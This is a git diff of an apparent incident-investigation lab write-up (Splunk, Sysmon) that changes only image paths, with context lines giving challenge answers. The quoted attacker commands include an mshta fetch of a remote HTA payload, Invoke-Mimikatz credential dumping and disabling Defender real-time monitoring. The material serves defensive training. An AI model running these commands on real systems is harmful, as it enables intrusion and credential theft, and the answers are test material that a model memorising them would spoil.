@@ -68,9 +68,9 @@ The query pivots on the primary alert host. Reviewing process creation events on
 ```
 JP-BROWN-WS
 ```
-![Answer](../images/Zero-Tolerance-1.png)
+![Answer](../imgs/Zero-Tolerance-1.png)
 
-![Answer](../images/Zero-Tolerance-2.png)
+![Answer](../imgs/Zero-Tolerance-2.png)
 
 ---
 
@@ -92,7 +92,7 @@ The attacker relied on the victim (`jp.brown`) opening what appeared to be a leg
 ```
 T1204.002
 ```
-![Answer](../images/Zero-Tolerance-3.png)
+![Answer](../imgs/Zero-Tolerance-3.png)
 
 ---
 
@@ -115,7 +115,7 @@ total_bytes:  851
 
 This confirmed `jp.brown` downloaded a ZIP file disguised as a resume.
 
-![Answer](../images/Zero-Tolerance-4.png)
+![Answer](../imgs/Zero-Tolerance-4.png)
 
 **Step 2 — Splunk Correlation:**
 
@@ -146,7 +146,7 @@ Host:            JP-BROWN-WS
 ```
 C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk
 ```
-![Answer](../images/Zero-Tolerance-5.png)
+![Answer](../imgs/Zero-Tolerance-5.png)
 
 ---
 
@@ -179,7 +179,7 @@ mshta.exe http://10.10.14.174/payload.hta
 ```
 C:\Windows\System32\mshta.exe
 ```
-![Answer](../images/Zero-Tolerance-6.png)
+![Answer](../imgs/Zero-Tolerance-6.png)
 
 ---
 
@@ -206,7 +206,7 @@ Network connection events (Sysmon Event ID 3) from `JP-BROWN-WS` show outbound c
 ```
 10.10.14.174
 ```
-![Answer](../images/Zero-Tolerance-7.png)
+![Answer](../imgs/Zero-Tolerance-7.png)
 
 ---
 
@@ -233,7 +233,7 @@ The beacon process was identified by correlating Sysmon network connection event
 ```
 C:\Windows\Temp\RuntimeBroker.exe
 ```
-![Answer](../images/Zero-Tolerance-8.png)
+![Answer](../imgs/Zero-Tolerance-8.png)
 
 ---
 
@@ -268,7 +268,7 @@ Using `HKCU` (current user) rather than `HKLM` (local machine) means the persist
 ```
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor
 ```
-![Answer](../images/Zero-Tolerance-9.png)
+![Answer](../imgs/Zero-Tolerance-9.png)
 
 ---
 
@@ -301,7 +301,7 @@ This extracts NTLM hashes, Kerberos tickets, and (if WDigest is enabled) plainte
 ```
 Invoke-Mimikatz -DumpCreds
 ```
-![Answer](../images/Zero-Tolerance-10.png)
+![Answer](../imgs/Zero-Tolerance-10.png)
 
 ---
 
@@ -332,7 +332,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 DisableRealtimeMonitoring
 ```
-![Answer](../images/Zero-Tolerance-11.png)
+![Answer](../imgs/Zero-Tolerance-11.png)
 
 ---
 
@@ -362,9 +362,9 @@ PID: 6612
 ```
 6612
 ```
-![Answer](../images/Zero-Tolerance-12.png)
+![Answer](../imgs/Zero-Tolerance-12.png)
 
-![Answer](../images/Zero-Tolerance-13.png)
+![Answer](../imgs/Zero-Tolerance-13.png)
 
 ---
 
@@ -395,7 +395,7 @@ Timestamp: 2025-11-14 05:19:42 UTC
 ```
 2025-11-14 05:19:42
 ```
-![Answer](../images/Zero-Tolerance-14.png)
+![Answer](../imgs/Zero-Tolerance-14.png)
 
 ---
 
@@ -439,7 +439,7 @@ The attacker downloaded the collection script directly from the C2 server (`10.1
 ```
 C:\Windows\Temp\Setup-BackupServer.ps1
 ```
-![Answer](../images/Zero-Tolerance-15.png)
+![Answer](../imgs/Zero-Tolerance-15.png)
 
 ---
 
@@ -477,7 +477,7 @@ The first four extensions target **database backups and SQL files** — the high
 ```
 .bak, .backup, .sql, .mdb
 ```
-![Answer](../images/Zero-Tolerance-16.png)
+![Answer](../imgs/Zero-Tolerance-16.png)
 
 ---
 
@@ -512,7 +512,7 @@ The archive is renamed from `.zip` to `.dat` — a defense evasion technique tha
 ```
 C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat
 ```
-![Answer](../images/Zero-Tolerance-17.png)
+![Answer](../imgs/Zero-Tolerance-17.png)
 
 ---
 
